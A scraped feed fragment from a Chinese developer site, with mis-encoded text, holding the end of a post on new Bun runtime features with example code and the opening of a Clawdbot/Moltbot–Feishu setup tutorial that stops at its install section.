<li><code>JavaScriptCore</code> å‡çº§åˆ°æœ€æ–°ç‰ˆ</li>
<li><code>async/await</code> å¿«äº† <code>35%</code></li>
<li><code>Array.from</code> å¿«äº† <code>2å€</code></li>
<li><code>string.padStart</code> å’Œ <code>string.padEnd</code>å¿«äº†<code>90%</code></li>
<li><code>array.flat</code>å¿«äº†<code>3å€</code></li>
<li><code>ARM64</code> ä¸Šé¢æ€§èƒ½æå‡</li>
</ul>
<h2 data-id="heading-1">fetch å‘é€ HTTP è¯·æ±‚æ—¶ä¿ç•™å¤´éƒ¨å¤§å°å†™</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/data'</span>, {
    <span class="hljs-attr">headers</span>: {
        <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">'Bearer token123'</span>, <span class="hljs-comment">// å‘é€ "Authorization"</span>
        <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>, <span class="hljs-comment">// å‘é€ "Content-Type"</span>
        <span class="hljs-string">'X-Custom-Header'</span>: <span class="hljs-string">'value'</span> <span class="hljs-comment">// å‘é€ "X-Custom-Header"</span>
    }
});

<span class="hljs-keyword">const</span> headers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Headers</span>();
headers.<span class="hljs-title function_">set</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'text/plain'</span>); <span class="hljs-comment">// å‘é€ "Content-Type"</span>
</code></pre>
<p>è¿™ä¸ªæˆ‘æŒºå–œæ¬¢çš„ï¼Œç¼–ç¨‹å°±åº”è¯¥è¦å…·å¤‡ç¡®å®šæ€§ï¼Œè™½ç„¶httpåè®®ä¸åŒºåˆ†å¤´éƒ¨å±æ€§çš„å¤§å°å†™ï¼Œä½†ä½ æ˜æ˜ä¼ äº†<code>Authorization</code>ï¼ŒæœåŠ¡ç«¯æ¥å—å´å˜æˆäº†<code>authorization</code>ï¼Œè¿˜æ˜¯æ€ªåˆ«æ‰­çš„ã€‚</p>
<h2 data-id="heading-2">æ–°å¢ Bun.wrapAnsi()</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01d2aab533754581b680c2138675d98b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LmL6JmO6ZmI6ZqP5piT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770180743&amp;x-signature=q0%2BhTV9GACDjmK33gFPs0ca0OW4%3D" alt="" loading="lazy"/></p>
<p>Bunå·²ç»å†…ç½®äº†npmåŒ…wrap-ansiçš„å®ç°ï¼Œè¿™æ˜¯åœ¨ç»ˆç«¯æ˜¾ç¤ºè½¬ä¹‰å­—ç¬¦ï¼Œå½©è‰²è¾“å‡ºçš„æ–¹æ³•ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49b066683ed9462ab9fec22f8eea75dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LmL6JmO6ZmI6ZqP5piT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770180743&amp;x-signature=1oudFCDvMAYhrp2ejFHiUYsmTbE%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä¹‹å‰å†™è¿‡çš„ä¸€ç¯‡æ–‡ç« <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FUjsuNUOnrIoDwiXsnlaYZw" target="_blank" title="https://mp.weixin.qq.com/s/UjsuNUOnrIoDwiXsnlaYZw" ref="nofollow noopener noreferrer">ç›˜ç‚¹Bunå†…ç½®äº†å“ªäº›npmåŒ…åŠŸèƒ½</a>ç°åœ¨åˆèƒ½æ–°å¢ä¸€ä¸ªå†…ç½®å¯æ›¿æ¢çš„npmåŒ…äº†ã€‚</p>
<p>æˆ‘ç‰¹åˆ«å–œæ¬¢è¿™ç§<code>å…¨åŒ…å¹²</code>ï¼Œä¸ºå•¥å‘¢ï¼Ÿå› ä¸ºå¾ˆå¤šä¸œè¥¿æœ¬å°±ç®€å•ï¼Œå‡ ä¹ä¸‡å¹´ä¸å˜çš„ï¼Œå†…ç½®åˆ°è¿è¡Œæ—¶é‡Œé¢ï¼Œæ–¹ä¾¿åˆå¿«æ·ã€‚</p>
<p>åŒæ—¶å‘¢ï¼Œå†…ç½®å®ç°ä¸€èˆ¬æ€§èƒ½æ›´é«˜ï¼Œæ¯”å¦‚<code>Bun.wrapAnsi</code>å°±æ¯”<code>wrap-ansi</code>å¿«äº†<code>33å€-88å€</code>ï¼Œä¹Ÿå‡å°‘äº†å¾ˆå¤šæ‰¾åº“ï¼Œæ‰¾åŒ…çš„æ—¶é—´ï¼Œéå¸¸Niceã€‚</p>
<h2 data-id="heading-3">Markdown CPU Profile è¾“å‡º</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/584ceb4aea2e493789326199f78da611~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LmL6JmO6ZmI6ZqP5piT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770180743&amp;x-signature=OlYtEUw2BXjBXml36bZI8aZACMo%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä»…ç”Ÿæˆ Markdown é…ç½®æ–‡ä»¶</span>
bun --cpu-prof-md script.js

<span class="hljs-comment"># ç”Ÿæˆ Chrome DevTools JSON å’Œ Markdown æ ¼å¼</span>
bun --cpu-prof --cpu-prof-md script.js

<span class="hljs-comment"># ç”Ÿæˆä¸ V8 å…¼å®¹çš„å †å¿«ç…§ï¼ˆåœ¨ Chrome å¼€å‘è€…å·¥å…·ä¸­æ‰“å¼€ï¼‰</span>
bun --heap-prof script.js

<span class="hljs-comment"># ç”Ÿæˆ Markdown å †é…ç½®æ–‡ä»¶ï¼ˆç”¨äºä½¿ç”¨ grep/sed/awk è¿›è¡Œ CLI åˆ†æï¼‰</span>
bun --heap-prof-md script.js

<span class="hljs-comment"># æŒ‡å®šè¾“å‡ºä½ç½®</span>
bun --heap-prof --heap-prof-dir ./profiles --heap-prof-name my-snapshot.heapsnapshot script.js

</code></pre>
<p>é‡ç£…åŠŸèƒ½ï¼Œè€é“ä»¬ï¼ŒAIå‹å¥½çš„æ€§èƒ½åˆ†æï¼Œè°ƒä¼˜ï¼Œç›´æ¥å¾—åˆ°ä¸€ä¸ªæ€§èƒ½æ–¹é¢çš„mdæ–‡æ¡£ï¼Œæ‰”ç»™AIï¼Œé¡¹ç›®æ€§èƒ½é—®é¢˜ï¼Œå†…å­˜æ³„æ¼ï¼Œä¸€æ¸…äºŒæ¥šï¼Œä¼°è®¡è¿™ä¸ªåŠŸèƒ½å…¶ä»–å‡ ä¸ªè¿è¡Œæ—¶ï¼ŒåŒ…æ‹¬å…¶ä»–è¯­è¨€ä¹Ÿä¼šå¾ˆå¿«è·Ÿä¸Šã€‚</p>
<h2 data-id="heading-4">åŸç”Ÿ JSON5 æ”¯æŒ</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// è§£æJSON5å­—ç¬¦</span>
<span class="hljs-keyword">const</span> config = <span class="hljs-title class_">Bun</span>.<span class="hljs-property">JSON5</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">`{
  // Database configuration
  host: 'localhost',
  port: 5432,
  ssl: true,
}`</span>);

<span class="hljs-comment">// JSON5å­—ç¬¦ä¸²åŒ–</span>
<span class="hljs-keyword">const</span> output = <span class="hljs-title class_">Bun</span>.<span class="hljs-property">JSON5</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'app'</span>, <span class="hljs-attr">version</span>: <span class="hljs-number">1</span> });

<span class="hljs-comment">// ç›´æ¥å¯¼å…¥JSON5æ–‡ä»¶</span>
<span class="hljs-keyword">import</span> settings <span class="hljs-keyword">from</span> <span class="hljs-string">'./config.json5'</span>;
</code></pre>
<p>JSON5 æ˜¯ JSON çš„è¶…é›†ï¼Œå¢åŠ äº†å¼€å‘è€…å‹å¥½çš„ç‰¹æ€§ï¼Œå¦‚æ³¨é‡Šã€å°¾éšé€—å·ã€æœªåŠ å¼•å·çš„é”®ã€å•å¼•å·å­—ç¬¦ä¸²å’Œåå…­è¿›åˆ¶æ•°å­—ã€‚</p>
<p>å®ƒè¢« Chromiumã€Next.jsã€Babel å’Œ WebStorm ç­‰ä¸»è¦é¡¹ç›®ä½¿ç”¨ã€‚</p>
<p>JSON5 ç‰¹åˆ«é€‚ç”¨äºé…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­æ³¨é‡Šå’Œå°¾éšé€—å·å¯ä»¥æé«˜å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p>
<h2 data-id="heading-5">Bun.JSONL ç”¨äºæµå¼è§£æ JSONL</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> results = <span class="hljs-title class_">Bun</span>.<span class="hljs-property">JSONL</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'{"name":"Alice"}\n{"name":"Bob"}\n'</span>);
<span class="hljs-comment">// [{ name: "Alice" }, { name: "Bob" }]</span>

<span class="hljs-comment">// Uint8Array ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œ (UTF-8 BOM è‡ªåŠ¨å¿½ç•¥)</span>
<span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>().<span class="hljs-title function_">encode</span>(<span class="hljs-string">'{"a":1}\n{"b":2}\n'</span>);
<span class="hljs-keyword">const</span> records = <span class="hljs-title class_">Bun</span>.<span class="hljs-property">JSONL</span>.<span class="hljs-title function_">parse</span>(buffer);
<span class="hljs-comment">// [{ a: 1 }, { b: 2 }]</span>
</code></pre>
<p>Bun ç°åœ¨å†…ç½®æ”¯æŒè§£æ JSONLï¼ˆæ¢è¡Œç¬¦åˆ†éš”çš„ JSONï¼‰ã€‚</p>
<p>è¯¥è§£æå™¨ä½¿ç”¨ JavaScriptCore çš„ä¼˜åŒ– JSON è§£æå™¨ä»¥ C++å®ç°ï¼Œä¸ºå®Œæ•´è¾“å…¥å’Œæµå¼ä½¿ç”¨åœºæ™¯æä¾›å¿«é€Ÿè§£æã€‚</p>
<p>æˆ‘èƒ½æƒ³åˆ°çš„ä¸€ä¸ªåœºæ™¯å°±æ˜¯ï¼Œjsonæ ¼å¼çš„æ—¥å¿—åˆ†æï¼Œåº”è¯¥ä¼šå¾ˆæ–¹ä¾¿ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> chunk = <span class="hljs-string">'{"id":1}\n{"id":2}\n{"id":3'</span>;

<span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Bun</span>.<span class="hljs-property">JSONL</span>.<span class="hljs-title function_">parseChunk</span>(chunk);
result.<span class="hljs-property">values</span>; <span class="hljs-comment">// [{ id: 1 }, { id: 2 }]</span>
result.<span class="hljs-property">read</span>; <span class="hljs-comment">// 17 â€” characters consumed</span>
result.<span class="hljs-property">done</span>; <span class="hljs-comment">// false â€” incomplete value remains</span>
result.<span class="hljs-property">error</span>; <span class="hljs-comment">// null â€” no parse error</span>
</code></pre>
<p>åœ¨æµå¼åœºæ™¯ä¸­ï¼Œ parseChunk å°½å¯èƒ½è§£æå¤šä¸ªå®Œæ•´å€¼ï¼Œå¹¶è¿”å›è§£æçš„è¿›åº¦â€”â€”å½“ä»ç½‘ç»œæµé€æ­¥æ¥æ”¶æ•°æ®æ—¶å¾ˆæœ‰ç”¨ã€‚</p>
<h2 data-id="heading-6">S3 presign() ç°åœ¨æ”¯æŒ contentDisposition å’Œ type é€‰é¡¹</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { S3Client } <span class="hljs-keyword">from</span> <span class="hljs-string">'bun'</span>;

<span class="hljs-keyword">const</span> s3 = <span class="hljs-keyword">new</span> <span class="hljs-title function_">S3Client</span>({
    <span class="hljs-attr">region</span>: <span class="hljs-string">'us-east-1'</span>,
    <span class="hljs-attr">endpoint</span>: <span class="hljs-string">'https://s3.us-east-1.amazonaws.com'</span>,
    <span class="hljs-attr">accessKeyId</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">AWS_ACCESS_KEY_ID</span>,
    <span class="hljs-attr">secretAccessKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">AWS_SECRET_ACCESS_KEY</span>,
    <span class="hljs-attr">bucket</span>: <span class="hljs-string">'my-bucket'</span>
});

<span class="hljs-keyword">const</span> file = s3.<span class="hljs-title function_">file</span>(<span class="hljs-string">'report.pdf'</span>);

<span class="hljs-keyword">const</span> url = file.<span class="hljs-title function_">presign</span>({
    <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span>,
    <span class="hljs-attr">expiresIn</span>: <span class="hljs-number">900</span>,
    <span class="hljs-attr">contentDisposition</span>: <span class="hljs-string">'attachment; filename="quarterly-report.pdf"'</span>,
    <span class="hljs-attr">type</span>: <span class="hljs-string">'application/octet-stream'</span>
});
</code></pre>
<p>ä¿®å¤äº†ä¸€ä¸ªé—®é¢˜ï¼Œå³åœ¨ç”Ÿæˆé¢„ç­¾å URL æ—¶ S3File.presign() ä¼šå¿½ç•¥ contentDisposition å’Œ type é€‰é¡¹ã€‚</p>
<p>è¿™äº›é€‰é¡¹ç°åœ¨è¢«æ­£ç¡®åœ°åŒ…å«ä¸º response-content-disposition å’Œ response-content-type æŸ¥è¯¢å‚æ•°ã€‚</p>
<p>è¿™åœ¨ä½ å¸Œæœ›æµè§ˆå™¨å°†æ–‡ä»¶ä½œä¸ºé™„ä»¶ä¸‹è½½è€Œä¸æ˜¯å†…è”æ˜¾ç¤ºæ—¶ç‰¹åˆ«æœ‰ç”¨ã€‚</p>
<h2 data-id="heading-7">bun pm pack ç°åœ¨ä¼šå°Šé‡æ¥è‡ªç”Ÿå‘½å‘¨æœŸè„šæœ¬å¯¹ package.json çš„æ›´æ”¹</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// package.json</span>
{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"my-package"</span>,
  <span class="hljs-string">"version"</span>: <span class="hljs-string">"1.0.0"</span>,
  <span class="hljs-string">"scripts"</span>: {
    <span class="hljs-string">"prepack"</span>: <span class="hljs-string">"node prepack.js"</span>
  },
  <span class="hljs-string">"description"</span>: <span class="hljs-string">"Original description"</span>,
  <span class="hljs-string">"devDependencies"</span>: { <span class="hljs-comment">/* ... */</span> }
}

<span class="hljs-comment">// prepack.js - æ‰“åŒ…ä¹‹å‰æ”¹å˜package.json</span>
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
<span class="hljs-keyword">const</span> pkg = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'package.json'</span>, <span class="hljs-string">'utf8'</span>));
<span class="hljs-keyword">delete</span> pkg.<span class="hljs-property">devDependencies</span>;
pkg.<span class="hljs-property">description</span> = <span class="hljs-string">'Production build'</span>;
fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">'package.json'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(pkg, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>));

</code></pre>
<p>bun pm pack åœ¨è¿è¡Œ prepack ã€ prepare å’Œ prepublishOnly è„šæœ¬åé‡æ–°è¯»å– package.json ï¼Œç¡®ä¿è¿™äº›è„šæœ¬æ‰€åšçš„ä»»ä½•ä¿®æ”¹éƒ½åŒ…å«åœ¨ tarball ä¸­ã€‚</p>
<h2 data-id="heading-8">node:inspector åˆ†æå™¨ API</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> inspector <span class="hljs-keyword">from</span> <span class="hljs-string">'node:inspector/promises'</span>;

<span class="hljs-keyword">const</span> session = <span class="hljs-keyword">new</span> inspector.<span class="hljs-title class_">Session</span>();
session.<span class="hljs-title function_">connect</span>();

<span class="hljs-keyword">await</span> session.<span class="hljs-title function_">post</span>(<span class="hljs-string">'Profiler.enable'</span>);
<span class="hljs-keyword">await</span> session.<span class="hljs-title function_">post</span>(<span class="hljs-string">'Profiler.start'</span>);

<span class="hljs-keyword">const</span> { profile } = <span class="hljs-keyword">await</span> session.<span class="hljs-title function_">post</span>(<span class="hljs-string">'Profiler.stop'</span>);
<span class="hljs-keyword">await</span> session.<span class="hljs-title function_">post</span>(<span class="hljs-string">'Profiler.disable'</span>);
</code></pre>
<p>Bun ç°åœ¨é€šè¿‡ Chrome DevTools Protocol å®ç°äº† node:inspector Profiler APIï¼Œç”¨äº CPU åˆ†æã€‚</p>
<h2 data-id="heading-9">å¢åŠ æœ€å¤§ HTTP å¤´æ•°é‡</h2>
<p>è¯·æ±‚å’Œå“åº”ä¸­å…è®¸çš„æœ€å¤§ HTTP å¤´æ•°é‡å·²ä» 100 å¢åŠ åˆ° 200ã€‚</p>
<p>è¿™æé«˜äº†ä¸å‘é€å¤§é‡å¤´çš„æœåŠ¡çš„å…¼å®¹æ€§ï¼Œä¾‹å¦‚å…·æœ‰å¹¿æ³›å…ƒæ•°æ®çš„ API æˆ–é™„åŠ å¤šä¸ªè½¬å‘å¤´çš„ä»£ç†ã€‚</p>
<h2 data-id="heading-10">WebSocket URL å‡­è¯æ”¯æŒ</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å‡­è¯ä¼šè‡ªåŠ¨è½¬å‘</span>
<span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">'ws://username:password@example.com/socket'</span>);

<span class="hljs-comment">// ç”¨æˆ·æä¾›çš„æˆæƒæ ‡å¤´å…·æœ‰ä¼˜å…ˆæƒ</span>
<span class="hljs-keyword">const</span> ws2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">'ws://user:pass@example.com/socket'</span>, {
    <span class="hljs-attr">headers</span>: {
        <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">'Bearer custom-token'</span> <span class="hljs-comment">// è¿™å°†æ›¿æ¢é»˜è®¤è½¬å‘çš„ Authorization</span>
    }
});
</code></pre>
<p>WebSocket è¿æ¥ç°åœ¨æ­£ç¡®åœ°å°† URL ä¸­åµŒå…¥çš„å‡­è¯ä½œä¸ºåŸºæœ¬æˆæƒå¤´è½¬å‘ï¼Œä¸ Node.js è¡Œä¸ºä¸€è‡´ã€‚</p>
<p>å½“è¿æ¥åˆ°ä¸€ä¸ªåŒ…å«å‡­è¯çš„ WebSocket URLï¼ˆå¦‚ ws://user:pass@host ï¼‰æ—¶ï¼ŒBun ç°åœ¨ä¼šè‡ªåŠ¨æå–å‡­è¯ï¼Œå¹¶åœ¨ WebSocket å‡çº§æ¡æ‰‹è¿‡ç¨‹ä¸­å°†å…¶ä½œä¸ºæ­£ç¡®ç¼–ç çš„ Authorization: Basic å¤´éƒ¨å‘é€ã€‚</p>
<hr/>
<p>ä»¥ä¸Šå°±æ˜¯æœ¬æ¬¡æ›´æ–°å†…å®¹ï¼Œæˆ‘æ˜¯<code>ç¼–ç¨‹è®°è€…é™ˆéšæ˜“</code>ï¼Œç»™å¤§å®¶åˆ†äº«è¡Œä¸šçƒ­ç‚¹ï¼Œä»£ç æŠ€æœ¯ï¼Œç¼–ç¨‹èµ„è®¯ç­‰ï¼Œæ¬¢è¿å…³æ³¨~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Clawdbot å®Œæ•´å¯¹æ¥é£ä¹¦æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ­å»ºä½ çš„ä¸“å± AI åŠ©æ‰‹]]></title>    <link>https://juejin.cn/post/7600238071038197769</link>    <guid>https://juejin.cn/post/7600238071038197769</guid>    <pubDate>2026-01-28T10:43:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600238071038197769" data-draft-id="7600224355294199835" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Clawdbot å®Œæ•´å¯¹æ¥é£ä¹¦æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ­å»ºä½ çš„ä¸“å± AI åŠ©æ‰‹"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-28T10:43:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Clawdbot å®Œæ•´å¯¹æ¥é£ä¹¦æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ­å»ºä½ çš„ä¸“å± AI åŠ©æ‰‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T10:43:37.000Z" title="Wed Jan 28 2026 10:43:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    272
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Clawdbot å®Œæ•´å¯¹æ¥é£ä¹¦æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ­å»ºä½ çš„ä¸“å± AI åŠ©æ‰‹</h2>
<blockquote>
<p>æ³¨æ„æœ¬æ•™ç¨‹åœ¨ Linux ç³»ç»Ÿä¸‹è¿›è¡Œ</p>
</blockquote>
<p>Clawdbot ç”±äº Claude çš„ç‰ˆæƒé—®é¢˜ï¼Œå·²æ›´åä¸º Moltbotï¼Œå› æ­¤æœ¬æ•™ç¨‹åŸºäºæœ€æ–°ç‰ˆæœ¬ç¼–å†™ã€‚ä¸‹é¢è¿›å…¥å®‰è£…æµç¨‹</p>
<p>é¦–å…ˆå‡†å¤‡ä¸€å°é—²ç½®çš„äº‘æœåŠ¡å™¨æˆ– VPSï¼ˆæ¨èä½¿ç”¨é¦™æ¸¯æˆ–æµ·å¤–èŠ‚ç‚¹ï¼‰ã€‚ç”±äº Moltbot è¿è¡Œæ—¶æƒé™è¾ƒå¤§ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œä¸å»ºè®®åœ¨æœ¬åœ°æˆ–å·¥ä½œæœºä¸Šå®‰è£…ï¼Œæ¨èåœ¨ä¸€å°ç‹¬ç«‹çš„ç©ºæœåŠ¡å™¨ä¸Šéƒ¨ç½²ã€‚å‡†å¤‡å®Œæˆåï¼Œç™»å½•åˆ°æœåŠ¡å™¨ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fclawedbot-install" target="_blank" title="https://catchadmin.com/post/2026-01/clawedbot-install" ref="nofollow noopener noreferrer">åŸæ–‡ Clawdbot å®Œæ•´å¯¹æ¥é£ä¹¦æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ­å»ºä½ çš„ä¸“å± AI åŠ©æ‰‹</a></p>
<h3 data-id="heading-1">å®‰è£…</h3>
<blockquote>
